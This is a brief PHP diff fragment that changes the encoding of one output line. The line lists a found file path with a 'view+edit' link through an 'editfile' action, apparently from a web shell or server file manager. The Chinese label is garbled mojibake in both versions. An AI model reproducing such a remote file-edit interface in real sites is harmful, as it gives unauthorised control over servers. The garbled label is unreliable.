-echo "<span class=\"redfont\" $getpath>ÕÒµ½:$dir/$file</span> |<a href=\"?action=editfile&dir=$dir&editfile=$file\" target=\"_blank\">view+edit</a> | $end <br>";
+echo "<span class=\"redfont\" $getpath>æ‰¾åˆ°:$dir/$file</span> |<a href=\"?action=editfile&dir=$dir&editfile=$file\" target=\"_blank\">view+edit</a> | $end <br>";
 }
                               } 
                          }                    
